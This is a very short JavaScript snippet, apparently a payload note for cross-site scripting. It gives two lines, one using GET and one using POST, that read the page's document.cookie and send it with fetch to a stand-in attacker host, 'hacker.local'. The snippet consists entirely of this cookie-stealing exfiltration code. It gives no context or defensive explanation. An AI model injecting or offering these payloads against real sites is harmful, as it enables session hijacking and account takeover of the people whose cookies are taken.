//GET
fetch(`http://hacker.local?cookie=${document.cookie}`)
//POST
await fetch('http://hacker.local', {method: 'POST',headers: {'Accept': 'application/json,','Content-Type': 'application/json'},body: JSON.stringify({cookie: document.cookie})});